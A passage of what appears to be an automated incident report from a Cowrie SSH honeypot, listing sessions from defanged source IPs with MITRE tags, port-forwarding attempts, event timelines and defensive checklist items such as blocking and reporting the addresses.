| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:23 |
| **Last Seen** | 2026-08-23 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:23:19` | `cowrie.session.connect` |
| `2026-08-23 07:23:19` | `cowrie.client.version` |
| `2026-08-23 07:23:19` | `cowrie.client.kex` |
| `2026-08-23 07:23:20` | `cowrie.login.success` |
| `2026-08-23 07:23:20` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:23:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:23:20` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:23:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bed98b8d0cd

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-23 07:25 |
| **Last Seen** | 2026-08-23 07:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:25:14` | `cowrie.session.connect` |
| `2026-08-23 07:25:14` | `cowrie.client.version` |
| `2026-08-23 07:25:14` | `cowrie.client.kex` |
| `2026-08-23 07:25:16` | `cowrie.login.success` |
| `2026-08-23 07:25:17` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:25:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a83d1a49ff

| Field | Detail |
|---|---|
| **Source IP** | `201.208.182[.]123` |
| **First Seen** | 2026-08-23 07:25 |
| **Last Seen** | 2026-08-23 07:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:25:22` | `cowrie.session.connect` |
| `2026-08-23 07:25:22` | `cowrie.client.version` |
| `2026-08-23 07:25:22` | `cowrie.client.kex` |
| `2026-08-23 07:25:23` | `cowrie.login.success` |
| `2026-08-23 07:25:24` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.208.182[.]123` to AbuseIPDB if not already reported
- [ ] Block `201.208.182[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03bd7a53b6da

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:32 |
| **Last Seen** | 2026-08-23 07:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:32:46` | `cowrie.session.connect` |
| `2026-08-23 07:32:46` | `cowrie.client.version` |
| `2026-08-23 07:32:46` | `cowrie.client.kex` |
| `2026-08-23 07:32:47` | `cowrie.login.success` |
| `2026-08-23 07:32:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:32:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:32:47` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b31fe204b8e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:32 |
| **Last Seen** | 2026-08-23 07:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:32:49` | `cowrie.session.connect` |
| `2026-08-23 07:32:49` | `cowrie.client.version` |
| `2026-08-23 07:32:49` | `cowrie.client.kex` |
| `2026-08-23 07:32:50` | `cowrie.login.success` |
| `2026-08-23 07:32:50` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:32:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:32:51` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16c7c3026fd7

| Field | Detail |
|---|---|
| **Source IP** | `103.203.74[.]119` |
| **First Seen** | 2026-08-23 07:40 |
| **Last Seen** | 2026-08-23 07:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:40:50` | `cowrie.session.connect` |
| `2026-08-23 07:40:51` | `cowrie.client.version` |
| `2026-08-23 07:40:51` | `cowrie.client.kex` |
| `2026-08-23 07:40:53` | `cowrie.login.success` |
| `2026-08-23 07:40:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.203.74[.]119` to AbuseIPDB if not already reported
- [ ] Block `103.203.74[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-655b0220479a

| Field | Detail |
|---|---|
| **Source IP** | `42.248.129[.]234` |
| **First Seen** | 2026-08-23 07:41 |
| **Last Seen** | 2026-08-23 07:41 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:41:04` | `cowrie.session.connect` |
| `2026-08-23 07:41:06` | `cowrie.client.version` |
| `2026-08-23 07:41:06` | `cowrie.client.kex` |
| `2026-08-23 07:41:09` | `cowrie.login.success` |
| `2026-08-23 07:41:10` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.248.129[.]234` to AbuseIPDB if not already reported
- [ ] Block `42.248.129[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-268f653ab11c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:42 |
| **Last Seen** | 2026-08-23 07:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:42:32` | `cowrie.session.connect` |
| `2026-08-23 07:42:32` | `cowrie.client.version` |
| `2026-08-23 07:42:32` | `cowrie.client.kex` |
| `2026-08-23 07:42:33` | `cowrie.login.success` |
| `2026-08-23 07:42:33` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:42:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:42:33` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66bceed8b729

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:42 |
| **Last Seen** | 2026-08-23 07:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:42:34` | `cowrie.session.connect` |
| `2026-08-23 07:42:34` | `cowrie.client.version` |
| `2026-08-23 07:42:34` | `cowrie.client.kex` |
| `2026-08-23 07:42:35` | `cowrie.login.success` |
| `2026-08-23 07:42:35` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:42:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:42:35` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ee115eff650

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-08-23 07:45 |
| **Last Seen** | 2026-08-23 07:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:45:11` | `cowrie.session.connect` |
| `2026-08-23 07:45:12` | `cowrie.client.version` |
| `2026-08-23 07:45:12` | `cowrie.client.kex` |
| `2026-08-23 07:45:14` | `cowrie.login.success` |
| `2026-08-23 07:45:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4e759858985

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-08-23 07:50 |
| **Last Seen** | 2026-08-23 07:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:50:01` | `cowrie.session.connect` |
| `2026-08-23 07:50:02` | `cowrie.client.version` |
| `2026-08-23 07:50:02` | `cowrie.client.kex` |
| `2026-08-23 07:50:04` | `cowrie.login.success` |
| `2026-08-23 07:50:04` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-900da72e2359

| Field | Detail |
|---|---|
| **Source IP** | `63.47.149[.]59` |
| **First Seen** | 2026-08-23 07:50 |
| **Last Seen** | 2026-08-23 07:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:50:10` | `cowrie.session.connect` |
| `2026-08-23 07:50:11` | `cowrie.client.version` |
| `2026-08-23 07:50:11` | `cowrie.client.kex` |
| `2026-08-23 07:50:12` | `cowrie.login.success` |
| `2026-08-23 07:50:13` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.47.149[.]59` to AbuseIPDB if not already reported
- [ ] Block `63.47.149[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b3ec9c1431

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:51 |
| **Last Seen** | 2026-08-23 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:51:59` | `cowrie.session.connect` |
| `2026-08-23 07:51:59` | `cowrie.client.version` |
| `2026-08-23 07:51:59` | `cowrie.client.kex` |
| `2026-08-23 07:52:00` | `cowrie.login.success` |
| `2026-08-23 07:52:00` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:52:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:52:01` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c31a5f8002

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:52 |
| **Last Seen** | 2026-08-23 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:52:03` | `cowrie.session.connect` |
| `2026-08-23 07:52:03` | `cowrie.client.version` |
| `2026-08-23 07:52:03` | `cowrie.client.kex` |
| `2026-08-23 07:52:04` | `cowrie.login.success` |
| `2026-08-23 07:52:04` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:52:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:52:04` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1054c4ab365

| Field | Detail |
|---|---|
| **Source IP** | `222.186.68[.]153` |
| **First Seen** | 2026-08-23 07:54 |
| **Last Seen** | 2026-08-23 07:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:54:54` | `cowrie.session.connect` |
| `2026-08-23 07:54:54` | `cowrie.client.version` |
| `2026-08-23 07:54:54` | `cowrie.client.kex` |
| `2026-08-23 07:54:57` | `cowrie.login.success` |
| `2026-08-23 07:54:58` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.186.68[.]153` to AbuseIPDB if not already reported
- [ ] Block `222.186.68[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2179ba0567d

| Field | Detail |
|---|---|
| **Source IP** | `121.22.99[.]2` |
| **First Seen** | 2026-08-23 07:55 |
| **Last Seen** | 2026-08-23 07:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:55:03` | `cowrie.session.connect` |
| `2026-08-23 07:55:04` | `cowrie.client.version` |
| `2026-08-23 07:55:04` | `cowrie.client.kex` |
| `2026-08-23 07:55:06` | `cowrie.login.success` |
| `2026-08-23 07:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.22.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `121.22.99[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-734dc25a500b

| Field | Detail |
|---|---|
| **Source IP** | `80.233.77[.]136` |
| **First Seen** | 2026-08-23 07:57 |
| **Last Seen** | 2026-08-23 07:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:57:52` | `cowrie.session.connect` |
| `2026-08-23 07:57:52` | `cowrie.client.version` |
| `2026-08-23 07:57:52` | `cowrie.client.kex` |
| `2026-08-23 07:57:53` | `cowrie.login.success` |
| `2026-08-23 07:57:54` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.77[.]136` to AbuseIPDB if not already reported
- [ ] Block `80.233.77[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb734f5e6669

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-23 07:57 |
| **Last Seen** | 2026-08-23 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:57:53` | `cowrie.session.connect` |
| `2026-08-23 07:57:53` | `cowrie.client.version` |
| `2026-08-23 07:57:54` | `cowrie.client.kex` |
| `2026-08-23 07:57:54` | `cowrie.login.success` |
| `2026-08-23 07:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00b45ead6341

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-08-23 07:57 |
| **Last Seen** | 2026-08-23 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:57:54` | `cowrie.session.connect` |
| `2026-08-23 07:57:54` | `cowrie.client.version` |
| `2026-08-23 07:57:54` | `cowrie.client.kex` |
| `2026-08-23 07:57:55` | `cowrie.login.success` |
| `2026-08-23 07:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e940ce54a6e4

| Field | Detail |
|---|---|
| **Source IP** | `64.62.156[.]10` |
| **First Seen** | 2026-08-23 08:00 |
| **Last Seen** | 2026-08-23 08:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0[.]0 Safari/537.36 Edg/139.0.0[.]0, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:00:06` | `cowrie.session.connect` |
| `2026-08-23 08:00:06` | `cowrie.login.success` |
| `2026-08-23 08:00:06` | `cowrie.session.params` |
| `2026-08-23 08:00:06` | `cowrie.command.input` |
| `2026-08-23 08:00:06` | `cowrie.command.input` |
| `2026-08-23 08:00:06` | `cowrie.command.failed` |
| `2026-08-23 08:00:06` | `cowrie.command.input` |
| `2026-08-23 08:00:06` | `cowrie.command.failed` |
| `2026-08-23 08:00:06` | `cowrie.command.input` |
| `2026-08-23 08:00:06` | `cowrie.log.closed` |
| `2026-08-23 08:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.62.156[.]10` to AbuseIPDB if not already reported
- [ ] Block `64.62.156[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-852ffa4e29ae

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:01 |
| **Last Seen** | 2026-08-23 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:01:38` | `cowrie.session.connect` |
| `2026-08-23 08:01:38` | `cowrie.client.version` |
| `2026-08-23 08:01:38` | `cowrie.client.kex` |
| `2026-08-23 08:01:39` | `cowrie.login.success` |
| `2026-08-23 08:01:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:01:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:01:39` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dd2f01ed8ec

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:01 |
| **Last Seen** | 2026-08-23 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:01:42` | `cowrie.session.connect` |
| `2026-08-23 08:01:42` | `cowrie.client.version` |
| `2026-08-23 08:01:42` | `cowrie.client.kex` |
| `2026-08-23 08:01:43` | `cowrie.login.success` |
| `2026-08-23 08:01:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:01:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:01:43` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e61389666be

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:11 |
| **Last Seen** | 2026-08-23 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:11:07` | `cowrie.session.connect` |
| `2026-08-23 08:11:07` | `cowrie.client.version` |
| `2026-08-23 08:11:07` | `cowrie.client.kex` |
| `2026-08-23 08:11:08` | `cowrie.login.success` |
| `2026-08-23 08:11:08` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:11:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:11:08` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5daace4d88f8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:11 |
| **Last Seen** | 2026-08-23 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:11:11` | `cowrie.session.connect` |
| `2026-08-23 08:11:11` | `cowrie.client.version` |
| `2026-08-23 08:11:11` | `cowrie.client.kex` |
| `2026-08-23 08:11:12` | `cowrie.login.success` |
| `2026-08-23 08:11:12` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:11:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:11:13` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bfbbc271725

| Field | Detail |
|---|---|
| **Source IP** | `200.170.213[.]9` |
| **First Seen** | 2026-08-23 08:13 |
| **Last Seen** | 2026-08-23 08:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:13:15` | `cowrie.session.connect` |
| `2026-08-23 08:13:16` | `cowrie.client.version` |
| `2026-08-23 08:13:16` | `cowrie.client.kex` |
